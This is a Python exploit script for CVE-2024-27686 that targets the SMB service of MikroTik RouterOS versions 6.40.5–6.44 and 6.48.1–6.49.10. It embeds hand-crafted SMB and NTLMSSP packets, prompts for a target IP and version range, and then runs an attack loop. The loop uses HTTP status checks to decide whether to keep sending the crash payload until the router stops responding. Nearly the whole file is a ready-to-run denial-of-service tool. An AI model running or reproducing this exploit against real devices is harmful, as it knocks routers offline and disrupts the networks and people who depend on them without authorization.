#!/usr/bin/env python3
"""
Exploit Title: CVE-2024-27686: RouterOS SMB Denial of Service (DOS)
Credit: ice-wzl
Author: ThemeHackers
Modified: by ThemeHackers (Add HTTP Status Checker)
"""

import argparse
import socket
import sys
import requests
import time

# === Exploit Packets === #
FUZZED_PACKET_LOW = (
    b'\x00\x00\x00n\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x03\x00\xf1\x1f\x08\x00\x00\x00'
    b'\x00\x00\x00\xe1\xbe\x82\x00\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00G\xe5\x07\xf5\x07\xec\x01u\xe4Q]\x9e'
    b'\xea\xedn\xa9\t\x00\x00\x00H\x00&\x00\\\x00\\\x001\x009\x002\x00.\x001\x006\x008'
    b'\x00.\x001\x005\x00.\x007\x007\x00\\\x00p\x00u\x00b\x00'
)

PACKET_0 = (
    b'\x00\x00\x00\xea\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00$\x00\x05\x00\x01\x00\x00\x00\x7f\x00\x00\x00\xe8\xe4*\x99'
    b'\xc9\xeb\xb6E\xa2A\xe9(\xee%\xe5\xdfp\x00\x00\x00\x04\x00\x00\x00\x02\x02\x10\x02'
    b'\x00\x03\x02\x03\x11\x03\x00\x00\x01\x00&\x00\x00\x00\x00\x00\x01\x00 \x00\x01\x00'
    b'_\xf7m\xf2h*\x8f\x8ae\x0f8+T=Na8_\x0b@C\x82\xe7\x87\xc3qZ\xd7\xcf0M\x87\x00\x00'
    b'\x02\x00\n\x00\x00\x00\x00\x00\x04\x00\x02\x00\x01\x00\x04\x00\x03\x00\x00\x00'
    b'\x00\x00\x00\x00\x08\x00\x08\x00\x00\x00\x00\x00\x03\x00\x02\x00\x01\x00\x00\x00'
    b'\x05\x00\x1a\x00\x00\x00\x00\x001\x009\x002\x00.\x001\x006\x008\x00.\x001\x005'
    b'\x00.\x008\x004\x00'
)

PACKET_2 = (
    b'\x00\x00\x00\xa2\xfeSMB@\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00 \x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    b'\x00\x00\x00\x00\x19\x00\x00\x01\x01\x00\x00\x00\x00\x00\x00\x00X\x00J\x00\x00'
    b'\x00\x00\x00\x00\x00\x00\x00`H\x05\x06+\x06\x01\x05\x05\x02\xa0>0<\xa0\x0e21540373'
    b'\xed\xba\xad211\x0c\x06\n+\x06\x01\x04\x01\x82294517887446830\x02\x02\n\xa2*'
    b'\x04(NTLMSSP\x00\x01\x00\x00\x00\x15\x82\x08b\x00\x00\x00\x00(\x00\x00\x00\x00'
    b'\x00\x00\x00(\x00\x00\x00\x06\x01\x00\x00\x00\x00\x00\x0f'
)

# === Functions === #
def open_connection(ip: str, port: int, timeout=5):
    try:
        s = socket.create_connection((ip, port), timeout=timeout)
        return s
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"[!] Connection failed: {e}")
        return None

def send_payload(version: int, target: str, port: int):
    sock = open_connection(target, port)
    if not sock:
        return
    try:
        if version == 1:
            sock.sendall(FUZZED_PACKET_LOW)
        elif version == 2:
            sock.sendall(PACKET_0)
            sock.sendall(PACKET_2)
        print(f"[+] DOS payload sent to {target}:{port} for version group {version}")
    finally:
        sock.close()

def check_http_status(target: str):
    url = f"http://{target}"
    try:
        r = requests.get(url, timeout=5)
        print(f"[HTTP] Status Code: {r.status_code}")
        return r.status_code == 200
    except requests.exceptions.Timeout:
        print("[!] HTTP Request timed out.")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[!] HTTP error: {e}")
        return False

def ask_continue():
    while True:
        ans = input("[?] Timeout detected. Continue sending payload? [y/N]: ").strip().lower()
        if ans in ['y', 'yes']:
            return True
        elif ans in ['n', 'no', '']:
            return False

def parse_args():
    parser = argparse.ArgumentParser(
        description='Exploit for CVE-2024-27686 - MikroTik RouterOS SMB DOS',
        epilog='Discovered by: ice-wzl | Improved by: ThemeHackers'
    )
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=445, help='Target SMB port (default: 445)')
    parser.add_argument('--interval', type=float, default=2.0, help='Interval between attacks (default: 2s)')
    return parser.parse_args()

def select_version():
    print("[+] Select RouterOS version range:")
    print("\t[1] 6.40.5 - 6.44")
    print("\t[2] 6.48.1 - 6.49.10")
    try:
        choice = int(input("--> ").strip())
        if choice in [1, 2]:
            return choice
        else:
            print("[-] Invalid selection. Choose 1 or 2.")
            sys.exit(1)
    except ValueError:
        print("[-] Invalid input. Please enter a number.")
        sys.exit(1)

# === Main === #
if __name__ == '__main__':
    args = parse_args()
    version_choice = select_version()

    print("[*] Starting attack loop. Ctrl+C to stop.")
    while True:
        status = check_http_status(args.target)
        if status is True:
            send_payload(version_choice, args.target, args.port)
            time.sleep(args.interval)
        elif status is None:
            if ask_continue():
                send_payload(version_choice, args.target, args.port)
                time.sleep(args.interval)
            else:
                print("[*] Exiting.")
                break
        else:
            print("[+] Target returned non-200 or is down.")
            break
